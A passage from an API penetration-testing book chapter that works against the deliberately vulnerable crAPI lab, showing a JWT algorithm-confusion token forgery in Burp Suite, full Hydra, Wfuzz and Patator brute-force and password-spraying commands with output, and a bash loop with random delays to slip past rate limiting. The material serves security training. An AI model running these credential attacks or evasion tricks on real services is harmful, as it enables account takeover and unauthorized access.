{ "keys": [ { "kty": "RSA", "e": "AQAB", "use": "sig", "kid": "MKMZkDenUfuDF2byYowDj7tW5Ox6XG4Y1THTEGScRg8", "alg": "RS256", "n": "sZKrGYja9S7BkO-waOcupoGY6BQjixJkg1Uitt278NbiCSnBRw5_cmfuWFFFPgRxabBZBJwJAujnQrlgTLXnRRItM9SRO884cEXn-s4Uc8qwk6pev63qb8no6aCVY0dFpthEGtOP-3KIJ2kx2i5HNzm8d7fG3ZswZrttDVbSSTy8UjPTOr4xVw1Yyh_GzGK9i_RYBWHftDsVfKrHcgGn1F_T6W0cgcnh4KFmbyOQ7dUy8Uc6Gu8JHeHJVt2vGcn50EDtUy2YN-UnZPjCSC7vYOfd5teUR_Bf4jg8GN6UnLbr_Et8HUnz9RFBLkPIf0NiY6iRjp9ooSDkml2OGql3ww" } ] }</pre>			<p>We know that the user’s role is <code>user</code>, which makes us infer that this is a regular powerless <a id="_idIndexMarker321"/>persona. Our job now is to forge a token that makes this user an admin on crAPI. We can’t use the <code>-C</code> option of <code>jwt_tool</code> to crack the token since it was not signed with an HMAC algorithm. If a <a id="_idIndexMarker322"/>regular user’s role is called <code>user</code>, maybe an admin role is <code>admin</code>. We will check whether crAPI is vulnerable to the key confusion vulnerability, which consists of deceiving the web server by providing HS256 as a signing algorithm and checking whether the server’s token verification function is naïve enough to treat the provided public key as the HMAC secret. For the next test, you should <a id="_idIndexMarker323"/>consider using <strong class="bold">Burp Suite</strong> and installing the <strong class="bold">JWT</strong> and <strong class="bold">JWT Editor</strong> extensions. We will do the following:</p>
			<ol>
				<li>Obtain the server’s public key (which we’ve already got).</li>
				<li>Convert the key into an appropriate format.</li>
				<li>Forge a new JWT by setting the “alg” header to HS256.</li>
				<li>Sign the new token with HS256 and use the public key as the symmetric secret.</li>
			</ol>
			<p>Just follow this sequence of steps, and you will be good:</p>
			<ol>
				<li>Open Burp Suite and install the previously mentioned extensions. You can do this via the <strong class="bold">Extensions</strong> | <strong class="bold">BApp </strong><strong class="bold">Store</strong> tabs.</li>
				<li>Click on the <strong class="bold">JWT Editor</strong> extension and then click on <strong class="bold">New </strong><strong class="bold">RSA Key</strong>.</li>
				<li>On this window, paste the JWKS contents inside the <code>key</code> block (when pasting, suppress the <code>keys</code> part and the surrounding curly brackets).</li>
				<li>Next, select the <strong class="bold">PEM</strong> radio button. This will reveal the public key in PEM format.</li>
				<li>Copy this text and click the <strong class="bold">OK</strong> button.</li>
				<li>Move to the <strong class="bold">Decoder</strong> extension, paste the PEM public key, click the <strong class="bold">Encode as…</strong> button, and choose <strong class="bold">Base64</strong>. Copy the results.</li>
				<li>Return to the <strong class="bold">JWT Editor</strong> extension and click on <strong class="bold">New Symmetric Key</strong>. This will open a window with <strong class="bold">Random secret</strong> selected by default.</li>
				<li>Just click on the <strong class="bold">Generate</strong> button.</li>
				<li>Replace the contents of the <code>k</code> parameter with the text you copied from the <strong class="bold">Decoder</strong> extension.</li>
				<li>Click <strong class="bold">OK</strong>.</li>
			</ol>
			<p>Configure <a id="_idIndexMarker324"/>your web browser to use Burp Suite as a proxy. By default, Burp Suite runs on localhost port <code>8080</code>, but this <a id="_idIndexMarker325"/>is adjustable. Log in to crAPI with a valid username and password. This will generate a valid token. Switch to the <code>/identity/api/v2/vehicle/vehicles</code>. Select this request, right-click on it, and choose <strong class="bold">Send to repeater</strong>. Open <strong class="bold">Repeater</strong>. You will see the <strong class="bold">JSON Web Tokens</strong> tab beside the <strong class="bold">Raw</strong> and <strong class="bold">Hex</strong> tabs. Click on it. Change the algorithm to <strong class="bold">HS256</strong> and the role to <strong class="bold">admin</strong>.</p>
			<p>Now click on the <code>/workshop/api/shop/products</code>, and send the request. It fails with an <code>Invalid JWT Token</code> message. This probably means the JWT implementation of crAPI is not vulnerable to the key confusion vulnerability. However, if you change the endpoint to <code>/identity/api/v2/user/dashboard</code>, crAPI will return a valid response with a JSON structure stating our original role (<em class="italic">Figure 4</em><em class="italic">.2</em>):</p>
			<div><div><img src="img/B19657_04_02.jpg" alt="Figure 4.2 – crAPI accepting the forged token for the user dashboard endpoint only"/>
				</div>
			</div>
			<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 4.2 – crAPI accepting the forged token for the user dashboard endpoint only</p>
			<p>Session tokens, bearer tokens, and JWTs serve similar purposes but differ in their implementations. Session tokens are typically stored on the server, and their corresponding <a id="_idIndexMarker326"/>data is stored on <a id="_idIndexMarker327"/>the server side. Bearer tokens are self-contained, often used in OAuth for API AuthZ, while JWTs are a type of bearer token with additional features such as claims and digital signatures, making them versatile for secure data exchange. Session tokens are more closely tied to user sessions and are often used in web applications to maintain user state.</p>
			<p>In essence, while session tokens are specific to user sessions in web applications, bearer tokens and JWTs are broader concepts used for various AuthN and AuthZ purposes, each offering unique advantages and considerations in different contexts. Understanding their characteristics is crucial for secure and effective implementation in web development and API security.</p>
			<p>In the next section, we will look at how we can discover and implement AuthN and AuthZ with weak credentials and default accounts.</p>
			<h1 id="_idParaDest-63"><a id="_idTextAnchor065"/>Testing for weak credentials and default accounts</h1>
			<p>When reading this section’s title, as an attentive reader, you probably drew a parallel with several <a id="_idIndexMarker328"/>routers, access points, network bridges, and <a id="_idIndexMarker329"/>an infinite number of <strong class="bold">Internet of Things</strong> (<strong class="bold">IoT</strong>) devices that are out there. Unfortunately, depending on the customer’s needs, they are just briefly configured and put to work, almost as a “plug-and-play” box. As a matter of fact, some are designed to be installed in exactly this way. The problem is that some of those types of equipment are somehow meant to be intelligent, which would require more complex software running and the <strong class="bold">requirement for credentials</strong>. As many users/customers simply don’t care about how the product works, a complete universe of possibilities opens up to explore default credentials.</p>
			<p>The same can happen with APIs. Sometimes, the developer forgets to delete a credential pair used just for testing, sometimes it’s hardcoded somewhere in the code, which resides in a public repository, and sometimes powerful permissions are assigned to these credentials, which is the worst thing that can happen on an API. In other scenarios, the default accounts are not there, but the credentials, purposefully or not – yes, sometimes there could be malicious intent – are weak in the sense of being poorly secure. Simple and/or short passwords, badly implemented pseudorandom number generators, small seeds and salts, vulnerable hashing, and encryption algorithms, to name a few, are some examples of how weak credentials may be created and spread.</p>
			<h2 id="_idParaDest-64"><a id="_idTextAnchor066"/>Brute-force attacks</h2>
			<p>This is possibly the first topic that comes up in any discussion about application credentials. If you <a id="_idIndexMarker330"/>search Google for something such as <em class="italic">the most used passwords</em> or <em class="italic">common passwords</em>, or combinations of such terms, you will be surprised by the number of results. In the <em class="italic">Further reading</em> section of this chapter, you’ll find a list of catalogs of passwords, some of them with gigs of size, that can be leveraged.</p>
			<p>In the context of API pentesting, brute-force attacks target AuthN endpoints where credentials are required for access. You may automate the process using specialized tools that streamline the brute-force process by enabling you to specify username and password lists, target endpoints, and define attack parameters. Some tools that will be very handy are hashcat, Medusa, and Hydra. Let’s first try to use Hydra against crAPI. But first, we need to understand how crAPI handles AuthN attempts. Either using Burp Suite or ZAP, or even the developer tools of your web browser, open the login page and type in any email address and password. crAPI will obviously reject your attempt, but the important part is how the request is sent. You will discover something like this:</p>
			<pre class="source-code">
POST /identity/api/auth/login HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8888/login
Content-Type: application/json
Content-Length: 49
Origin: http://localhost:8888
Connection: close
{"email":"blabla@domain.com","password":"nonono"}</pre>			<p>We need to <a id="_idIndexMarker331"/>respect several of these fields when applying Hydra so crAPI’s backend can correctly process our attempts. The application is expecting the input to be in JSON format. Likewise, the error output will be in JSON as well:</p>
			<pre class="source-code">
...
Content-Type: application/json
{"token":null,"type":"Bearer","message":"Given Email is not registered! "}
...</pre>			<p>Now, try this with a valid credential pair and observe the corresponding response. The answer is the JWT among other parameters:</p>
			<pre class="source-code">
...
Content-Type: application/json
...
{"token":"eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJtYXVyaWNpb0Bkb21haW4uY29tIiw icm9sZSI6InVzZXIiLCJpYXQiOjE3MDc2NTkzODIsImV4cCI6MTcwODI2NDE4Mn0.X57Sg 1JDwDV1Zs7vyEcO_tJCcemXCHMV27ttJe-nuoF2hYpxRRAwYiM9BkKNDpWmfBSu4YtQTIa DjI9ueyC3xQM_g_w3Z6i3RxxMhZoEVf5psujkbmJi2DaznLiEISsVXashO30SOQKNFuCx v_1K8QtReRkGV7EzZcLrucEnM56vMfz6-Z0Kd5ND4YXBNDsj5CjdnehuxtjVrCf-q33a3J W9jwoqJPiFRoMVlbnX3wv3VHjU0768tpYwdon80th7Je34JgtLafbHDb9m8aSsnvdnnO7O LWOBtJC65HD14jdanY0GPt9ltqA9_-d2f6zk1jIOSJO-3emQqaXM6lMSAQ","type":"Bearer","message":null}</pre>			<p>Now, pick all the request parameters that were sent as part of the successful login activity. You’ll need <a id="_idIndexMarker332"/>almost all of them to build the command. Regardless of the tool you used to capture the request, you’ll have the following parameters:</p>
			<pre class="source-code">
POST /identity/api/auth/login HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8888/login
Content-Type: application/json
Content-Length: 53
Origin: http://localhost:8888
Connection: close
{"email":"&lt;your username&gt;","password":"&lt;your password&gt;"}</pre>			<p>Hydra parallelizes the brute-force attempts for the sake of optimizing your search. Considering <code>admin</code> as a possible username (Hydra replaces <code>http</code> with <code>http-get</code> or <code>http-post</code>, depending <a id="_idIndexMarker333"/>on the type of verb you want to use), and a text file with passwords (<code>passlist.txt</code>), run the following:</p>
			<pre class="console">
$ hydra -l admin -v -P passlist.txt -s 8888 localhost http-post "/identity/api/auth/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:S=\"token\":H=Accept: */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate, br:H=Referer: http\://localhost\:8888/login:H =Content-Type: application/json:H=Origin: http\://localhost\:8888:H=Connection: close"
Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-07 03:09:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 50915 login tries (l:1/p:50915), ~3183 tries per task
[DATA] attacking http-post://localhost:8888/identity/api/auth/login
[STATUS] 9112.00 tries/min, 9112 tries in 00:01h, 41803 to do in 00:05h, 16 active
[STATUS] 9234.00 tries/min, 27702 tries in 00:03h, 23213 to do in 00:03h, 16 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-07 03:14:31</pre>			<p>Let’s explain some of the parameters first:</p>
			<ul>
				<li><code>-l</code>: Expects you to provide the sole username to test against</li>
				<li><code>-v</code>/<code>-V</code>: Activates the verbose mode</li>
				<li><code>-P</code>: Expects a password list file to be provided</li>
				<li><code>-s</code>: If the target is not using one of the default ports (<code>80</code> or <code>443</code>), you need to specify the port</li>
				<li><code>http-post</code>: The Hydra module to use</li>
			</ul>
			<p>Everything inside the double quotes is either part of the headers or the request body. The <code>"/identity/api/auth/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}"</code> part comprises the API endpoint plus the JSON structure crAPI expects to receive. Here, <code>^USER^</code> is replaced by the login name you provided with <code>-l</code>, whereas <code>^PASS^</code> is replaced with the passwords inside the <code>passlist.txt</code> file, one per attempt. After this, we specified what is expected to be received with a successful attempt (the <code>S</code> key). As we can see, when a successful login happens, we get access to a lot of data, including a <code>token</code> word followed by the corresponding JWT. All elements beginning with <code>H=</code> are part of the header. Also, observe the backslash character (<code>\</code>). It serves to escape <a id="_idIndexMarker334"/>the immediately following character so Hydra can process it rather than thinking it is, for example, the closing quote mark of the request or a semicolon separator.</p>
			<p>We have found nothing so far. Let’s try with a login file instead, where there will be several usernames. This file has lines such as <code>admin</code>, <code>administrator</code>, <code>Administrator</code>, <code>admin123</code>, and <code>4dm1n</code>. Of course, the more lines you have in both files, the lengthier the task will be. Better to leave this running while you do something else. Hydra also allows you to specify how many threads you’d like to run at the same time. The following command fits in a single line:</p>
			<pre class="console">
$ hydra -l login.txt -v -P passlist.txt -s 8888 localhost http-post "/identity/api/auth/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:S=\"token\":H=Accept: */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate, br:H=Referer: http\://localhost\:8888/login:H=Content-Type: application/json:H=Origin: http\://localhost\:8888:H=Connection: close"</pre>			<p>Observe the parallel threads (16 by default) running the attack:</p>
			<pre class="console">
$ ps a | grep hydra
  15897 pts/0    S+     0:08 hydra -L login.txt -P passlist.txt http-post://localhost:8888/identity/api/auth/login
  15919 pts/0    S+     0:03 hydra -L login.txt -P passlist.txt http-post://localhost:8888/identity/api/auth/login
...
  15933 pts/0    S+     0:03 hydra -L login.txt -P passlist.txt http-post://localhost:8888/identity/api/auth/login
  15934 pts/0    S+     0:02 hydra -L login.txt -P passlist.txt http-post://localhost:8888/identity/api/auth/login</pre>			<p>The tool managed to find a valid username/password pair:</p>
			<pre class="console">
[8888][http-post-form] host: localhost   login: admin@example.com   password: Admin!123</pre>			<p>Bear in mind that methods like the one used by Hydra can be detected by the API backend itself <a id="_idIndexMarker335"/>or more easily by some other protection layer, such as a WAF. The tool generates thousands or even millions of requests to the target endpoint, which could be measured and blocked by API endpoints that have rate-limiting protections. Let’s check, for example, how a crAPI log entry looks like:</p>
			<pre class="console">
$ docker logs -f crapi-web
admin [07/Feb/2024:02:28:02 +0000] "POST /identity/api/auth/login HTTP/1.1" 400 0 "-" "Mozilla/4.0 (Hydra)"</pre>			<p>To circumvent this, you should run multiple instances of Hydra from different IP addresses. Either launch several containers, preferably with separate network segments, or create a controlled environment with spoofed IP addresses. Of course, never spoof valid IP addresses on the internet. We are security professionals, not criminals.</p>
			<p>Other valid tools for brute-force explorations are Medusa and ncracker. However, these were not as successful on the tests that I conducted to write this chapter, or they did not have the same kind of performance as Hydra. You must never forget the wordlists when running these types of attacks. Combining them and mixing and matching them are all valid ways of getting closer to the credentials some API endpoint apply.</p>
			<p>There’s a <a id="_idIndexMarker336"/>very interesting utility called <strong class="bold">Common User Passwords Profiler</strong> (<strong class="bold">CUPP</strong>; <a href="https://github.com/Mebus/cupp">https://github.com/Mebus/cupp</a>). It facilitates downloading big password lists from the internet. It also has an interactive mode that creates lists based on questions it asks you about the target/victim. An advantage is that this Python code does not require any third-party module, allowing you to explore <a id="_idIndexMarker337"/>it right after downloading it. Let’s carry out a test with crAPI. We’ll download default usernames and passwords from AlectoDB (currently consolidated under <a href="https://github.com/yangbh/Hammer/tree/master/lib/cupp">https://github.com/yangbh/Hammer/tree/master/lib/cupp</a>). Clone CUPP’s repository and type the following:</p>
			<pre class="console">
$ python cupp.py -a  ___________    cupp.py!                 # Common       \                     # User        \   ,__,             # Passwords         \  (oo)____         # Profiler            (__)    )\                 ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]                            [ Mebus | https://github.com/Mebus/]
[+] Checking if alectodb is not present...
[+] Downloading alectodb.csv.gz from https://github.com/yangbh/... ... 

[+] Exporting to alectodb-usernames.txt and alectodb-passwords.txt [+] Done.</pre>			<p>You just got the two text files with usernames and passwords. You’ll see more about this topic in <a href="B19657_06.xhtml#_idTextAnchor102"><em class="italic">Chapter 6</em></a>, <em class="italic">Error Handling and Exception Testing</em>, but there’s another tool called <code>Wfuzz</code> (<a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a>) that you can install in multiple ways and helps with carrying out brute-force attacks leveraging password lists. I installed it <a id="_idIndexMarker338"/>through <code>pip</code> and tested it against crAPI with the just downloaded usernames and passwords. The results follow:</p>
			<pre class="console">
$ wfuzz -z file,alectodb-usernames.txt -z file,alectodb-passwords.txt \
  -X POST -H "Content-Type: application/json" \
  -d '{"email":"FUZZ","password":"FUZ2Z"}' \
  http://localhost:8888/identity/api/auth/login
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://localhost:8888/identity/api/auth/login
Total requests: 915096
=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                              =====================================================================
000000001:   400        0 L      118 W      1520 Ch     "123456"                                                                      000000042:   400        0 L      61 W       797 Ch      "2222"                                                                                                               000000041:   400        0 L      61 W       797 Ch      "21241036"                                                                                                           000000015:   400        0 L      61 W       797 Ch      "(unknown)"                                                                                                          000000003:   400        0 L      61 W       797 Ch      "!manage"                                                                                                            000000043:   400        0 L      61 W       797 Ch      "22222"
…Output omitted for brevity…
Total time: 0
Processed Requests: 1105854
Filtered Requests: 0
Requests/sec.: 0</pre>			<p>Observe the request numbers in the <code>ID</code> column. They are not in order. That’s because <code>Wfuzz</code> organizes them in different threads so multiple requests can be sent at once. We didn’t manage to find a match on this attempt, but this does not reduce the tool’s effectiveness. You can combine it with other wordlists. <code>Wfuzz</code> is very convenient as it attempts multiple combinations of usernames and passwords against the target and shows all <a id="_idIndexMarker339"/>successful attempts. Of course, if you already know either the username or the password, this will tremendously reduce the program’s effort. A reference to a list of links can be found at the end of the chapter.</p>
			<h2 id="_idParaDest-65"><a id="_idTextAnchor067"/>Common credentials and default accounts</h2>
			<p>You may use the knowledge you acquired in the previous chapter, on topics such as OSINT techniques and other enumeration tips, to get your hands on some default API credentials. The API documentation itself is a valid source for default credentials. In your pentesting <a id="_idIndexMarker340"/>endeavors, you may discover a website leveraging a backend with a marketplace API provider. Some providers have default credentials, including administrative ones, for their products. Hence, by either inspecting the documentation or other active or passive methods, you may discover a couple of credential pairs.</p>
			<p>Using the same approach as the previous sub-section, start by googling <em class="italic">default passwords</em> or <em class="italic">common passwords</em>. A list generated in 2024 is available at the end of the chapter. Some system administrators still run their API backends with default admin usernames <a id="_idIndexMarker341"/>such as <code>admin</code> or <code>administrator</code>. Even websites running popular <code>admin</code> or <code>administrator</code> would be the superuser’s username. Localized versions of it, such as <code>administrador</code>, are also valid.</p>
			<p>Of course, you can use Hydra, Medusa, or Burp Suite, with its <code>repeater</code> or <code>intruder</code> features, or even do this via your web browser, but you can also automate your effort by crafting a script with a simple loop such as the following one:</p>
			<pre class="source-code">
#!/bin/bash
passwords="wordlist.txt"
MAXWAIT=2
while IFS= read -r line
do
  curl -X POST --data "username=admin&amp;password=$line &gt;&gt; output.txt
  sleep $((RANDOM % MAXWAIT))
done &lt; passwords</pre>			<p>In the preceding code, the <code>wordlist</code> filename is put inside the <code>$passwords</code> variable. Then, I set the <code>$MAXWAIT</code> variable to <code>2</code>. Inside the <code>while</code> loop, I executed the <code>curl</code> command and appended its output inside the <code>output.txt</code> file. Then, I put the code to sleep for a random number of seconds between 0 and 2. The <code>$RANDOM</code> variable is built into <a id="_idIndexMarker342"/>Bash and returns a random integer between 0 and 32,767. That integer is then divided by <code>$MAXWAIT</code> and the remainder is the number of seconds to put the script to sleep. This is just to avoid being throttled by some API rate-limiting control. The script finished with the end of the <code>while</code> loop reading the <code>wordlist.txt</code> file line by line.</p>
			<p>Doing the opposite <a id="_idIndexMarker343"/>is also valid, and is a technique called <strong class="bold">password spraying</strong>. It consists of testing a single password or a small set of passwords against multiple user accounts. It is quite useful for applications that generate the same initial password for all users and suggest users change the password after the first login. Solely relying on the human factor is not exactly a security best practice. To carry out password spraying, there are some tools, such as CrackMapExec, Patator, and Metasploit (which is an umbrella tool with tons of plugins). Let’s consider Patator for this task.</p>
			<p>If you are following this chapter after having installed the lab environment mentioned in <a href="B19657_02.xhtml#_idTextAnchor028"><em class="italic">Chapter 2</em></a>, getting Patator running on top of Ubuntu is as straightforward as running <code>sudo apt-get update</code>; <code>sudo apt-get install patator</code>. Just be mindful that this is a package with lots of dependencies. When I wrote this chapter, the software and its dependencies were consuming around 300 MB of disk space.</p>
			<p>After digging a lot and discovering that version 0.9 of Patator (the one used to write this chapter) seems to not correctly handle HTTP request headers, I ended up with the following:</p>
			<pre class="console">
$ patator http_fuzz method=POST resolve=domain:127.0.0.1 url=http://localhost:8888/identity/api/auth/login auto_urlencode=0 body='{"email": "FILE0", "password": "Admin!123"}' 0=./userlist.txt header=@fuzzerheader.txt
patator INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.10.12 at 2024-02-18 18:40 -03
patator INFO -
patator INFO - code size:clen   time | candidate           |   num | mesg
patator INFO - ----------------------------------------------------------
patator INFO - 500  595:74     0.163 | user@domain.com     |     5 | HTTP/1.1 500
patator INFO - 500  595:74     0.252 | user@example.com    |     6 | HTTP/1.1 500
patator INFO - 500  595:74     0.451 | admin@domain.com    |     1 | HTTP/1.1 500
patator INFO - 200  1031:509   0.442 | admin@example.com   |     2 | HTTP/1.1 200
patator INFO - 500  595:74     0.359 | dummy@domain.com    |     3 | HTTP/1.1 500
patator INFO - 500  595:74     0.366 | dummy@example.com   |     4 | HTTP/1.1 500
patator INFO - Hits/Done/Skip/Fail/Size: 6/6/0/0/6, Avg: 5 r/s, Time: 0h 0m 1s</pre>			<p>Just to keep <a id="_idIndexMarker344"/>things consistent, the preceding command was typed on a single line. Now, let me explain to you all the parameters that are not self-explanatory:</p>
			<ul>
				<li><code>http_fuzz</code>: Patator has a considerable number of modules. This is the one to play with HTTP targets. As we were trying to authenticate against crAPI (an HTTP REST API implementation), it is the best choice.</li>
				<li><code>method=POST</code>: We need to tell <code>http_fuzz</code> which HTTP method we will use. To authenticate, crAPI expects the request to be sent using POST.</li>
				<li><code>resolve=domain:127.0.0.1</code>: This parameter needed to be added because Patator was getting confused with the URL. Since my crAPI implementation is running on my localhost, I’m just telling Patator that, when resolving the hostname, consider it as <code>127.0.0.1</code>. I know, it’s nonsense, but it was the way I found to make Patator work with my localhost URL.</li>
				<li><code>autourl_encode=0</code>: Instructs Patator to encode all the body’s characters before sending the request. This is incredibly useful especially when you are dealing with non-alphanumeric characters, such as the ones used by the JSON structure explained in the next point.</li>
				<li><code>body='{"email": "FILE0", "password": "Admin!123"}'</code>: This is the JSON structure representing the login. I put the default crAPI admin password for <a id="_idIndexMarker345"/>the sake of showing you what happens when the tool is successful. <code>FILE0</code> indicates that the email will be replaced with the lines of a file that will be later specified.</li>
				<li><code>0=./userlist.txt</code>: This matches the previous <code>FILE0</code> item. The <code>userlist.txt</code> file contains all usernames, one per line, taking the role of the login credential.</li>
				<li><code>header=@fuzzerheader.txt</code>: The <code>fuzzerheader.txt</code> file contains the required headers for the crAPI login request to work. This will change depending on how your target API endpoint was written and, as we discussed before, you need to enumerate the endpoint first so you can get to know its details.</li>
			</ul>
			<p>The <code>userlist.txt</code> file contents are as follows:</p>
			<pre class="source-code">
admin@domain.com
admin@example.com
dummy@domain.com
dummy@example.com
user@domain.com
user@example.com</pre>			<p>And the <code>fuzzerheader.txt</code> file has the following:</p>
			<pre class="source-code">
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8888/login
Content-Type: application/json
Origin: http://localhost:8888
Connection: close</pre>			<p>Observe the columned output of the Patator command previously executed. Each line corresponds to one of the combinations of username <a id="_idIndexMarker346"/>and password. In this example, a single password was considered, but you can alternatively use another text file (such as a wordlist) to feed the tool. In the <code>code</code> section, you can see the HTTP code sent as a response. The <code>size:clen</code> column shows the number of characters received in the response: the total size and the content length, respectively. The latter is the one that interests us. Time is self-explanatory. <code>Candidate</code> assumes each combination of username and password. If we were trying multiple passwords, the lines would be something such as <code>username:password</code>. <code>Num</code> corresponds to the combination number. Observe Patator does not necessarily follow the order in the <code>userlist.txt</code> file. Although <code>admin@domain.com</code> is on the first line, it shows up as on the third output line. Finally, the message with the code again.</p>
			<p>We are looking for the 200 codes, which denote the attempt was successful. In our case, it happened on the fourth output line, where <code>size</code> was substantially bigger compared to the other lines. Nevertheless, the size difference alone does not state anything at all. You should focus on all lines with the <code>200 response</code> code. Be warned that false positives can also happen. Hence, separate all usernames and passwords whose attempts seem to have been successful and investigate more.</p>
			<p>In the next section, we will go through the AuthZ mechanisms of an API.</p>
			<h1 id="_idParaDest-66"><a id="_idTextAnchor068"/>Exploring authorization mechanisms</h1>
			<p>So, we’ve played with the AuthN part, but that’s just part of the party. After gaining access to the system, we need to have enough power to do a number of things a regular user could not do. However, it’s worth mentioning that even a regular user may have read-only <a id="_idIndexMarker347"/>access to sensitive data or other users’ data, depending on how the API’s AuthZ controls were implemented.</p>
			<p>Exploring AuthZ mechanisms during API pentesting is crucial for identifying potential security vulnerabilities and ensuring that only authorized users or clients can access protected resources. AuthZ mechanisms define the rules and policies that govern access to API endpoints, data, and functionalities, and testing these mechanisms helps assess their effectiveness in enforcing access controls and preventing unauthorized access. Before going further into how we can explore API AuthZ mechanisms, we need to understand what they are. AuthZ mechanisms are controls that specify what exactly a user can and cannot do once they are authenticated. The most used methods as of the time of writing are as follows:</p>
			<ul>
				<li><strong class="bold">Role-Based Access Control (RBAC)</strong>: Each valid user in the system is assigned one or more roles that in turn dictate which actions are allowed. Depending <a id="_idIndexMarker348"/>on how the system was designed, some actions can also be explicitly denied. Once such a mechanism is detected, you can try to discover which roles exist and craft a way to bypass/invalidate the control. A real-world example would be a company whose employees belonging to the human resources department (role) would have access to payroll data whereas all others (excluding the board, of course) wouldn’t.</li>
				<li><strong class="bold">Attribute-Based Access Control (ABAC)</strong>: Combines parameters or attributes that are <a id="_idIndexMarker349"/>assigned to the user, the resource they are trying to access, and even the environment where the resource is physically or logically defined or located. This is a control usually applied by public cloud players, where such attributes are often called “labels” or “tags” (not to be confused with smart tokens or tags). They comprise key-value pairs where the cloud’s sysadmin can assign them to different users and resources to better group the assets. Permissions can be <a id="_idIndexMarker350"/>set based on such tags. You can try to manipulate or inject attributes to gain unauthorized access. A real-world example would be contractors that do service on an institution. Once they present themselves wearing the uniforms (tags) their companies provide, they are granted access to areas assigned to their contracting companies. However, each contractor can only access the areas designated for the company they were hired from. When another contractor working for the same company is eventually added or replaces a previous one, the new contractor must receive an analogous uniform. By wearing another contractor’s uniform, you may enter their company’s area possibly unnoticed.</li>
				<li><strong class="bold">OAuth scopes</strong>: We <a id="_idIndexMarker351"/>already covered what OAuth is and the power it provides to an API. In this context, scopes <a id="_idIndexMarker352"/>define the specific access levels or resources a user is authorized to request. A real-world example could be a military facility, where officers of different ranks would work together. Nevertheless, the context of information a major receives is higher than a captain’s, which is higher than a lieutenant’s, and so on and so forth. Impersonating an officer (bypassing a context) would give you access to restricted/privileged information.</li>
			</ul>
			<p>Let’s look at each of them in more detail.</p>
			<h2 id="_idParaDest-67"><a id="_idTextAnchor069"/>Role-based access control</h2>
			<p>Let’s <a id="_idIndexMarker353"/>suppose the system you are <a id="_idIndexMarker354"/>testing and trying to explore applies such a mechanism. crAPI does that, right? Do you remember when we were forging tokens pretending to have the <code>ROLE_ADMIN</code> role instead of <code>ROLE_USER</code>?</p>
			<p>In the realm of API security, RBAC plays a crucial role in safeguarding access to sensitive data and functionalities. This approach grants permissions based on predefined roles assigned to users or groups, ensuring that individuals only have the level of access necessary for their designated tasks.</p>
			<p>RBAC <a id="_idIndexMarker355"/>operates on three core components:</p>
			<ul>
				<li><code>admin</code>, <code>editor</code>, <code>reader</code>, or <code>guest</code>.</li>
				<li><strong class="bold">Users</strong>: Individual entities interacting with the API, typically identified through usernames, IDs, or other unique identifiers.</li>
				<li><strong class="bold">Permissions</strong>: Granular <a id="_idIndexMarker356"/>actions users can perform on API resources, such as <strong class="bold">Create, Read, Update, or </strong><strong class="bold">Delete</strong> (<strong class="bold">CRUD</strong>).</li>
			</ul>
			<p>Users first authenticate themselves with the API, providing credentials such as usernames and passwords or tokens. Based on the authenticated user, the system determines <a id="_idIndexMarker357"/>their assigned role(s). When a user requests <a id="_idIndexMarker358"/>access to a specific API resource, the system verifies whether their associated role(s) possess the necessary permissions for the requested action. If the user’s role has the required permission, access is granted; otherwise, it’s denied, and an appropriate error message is returned.</p>
			<p>Some <a id="_idIndexMarker359"/>benefits of RBAC are as follows:</p>
			<ul>
				<li><strong class="bold">Granular access control</strong>: Enables fine-grained control over API access by tailoring permissions to specific roles.</li>
				<li><strong class="bold">Reduced complexity</strong>: Simplifies access management by grouping similar permissions under roles.</li>
				<li><strong class="bold">Improved security</strong>: Minimizes the risk of unauthorized access by restricting actions based on user roles.</li>
			</ul>
			<p>Some examples of public APIs using RBAC include cloud storage APIs where granting read/write access to specific folders or files is based on user roles; social media APIs that allow users to post, edit, or delete content based on their account type (admin, moderator, or regular user); and <a id="_idIndexMarker360"/>e-commerce APIs that <a id="_idIndexMarker361"/>control access to product information, order management, and pricing data based on user roles (customer, vendor, or administrator).</p>
			<h2 id="_idParaDest-68"><a id="_idTextAnchor070"/>Attribute-based access control</h2>
			<p>ABAC goes further into the way access control works. Instead of simply relying on roles and <a id="_idIndexMarker362"/>their permissions, it offers a more nuanced and adaptable approach specifically suited for complex API environments. For example, healthcare APIs control access to sensitive patient <a id="_idIndexMarker363"/>data based on user roles, data sensitivity level, and access location. Financial APIs grant AuthZ for financial transactions based on user identity, account type, transaction amount, and time of day. IoT APIs enable secure device access and data exchange based on device type, location, and specific permissions associated with the device.</p>
			<p>Besides relying solely on predefined, and sometimes custom, roles, ABAC evaluates various attributes <a id="_idIndexMarker364"/>associated with different entities involved in an access request:</p>
			<ul>
				<li><strong class="bold">Subject</strong>: The user or entity requesting access (e.g., username, IP address, or device type).</li>
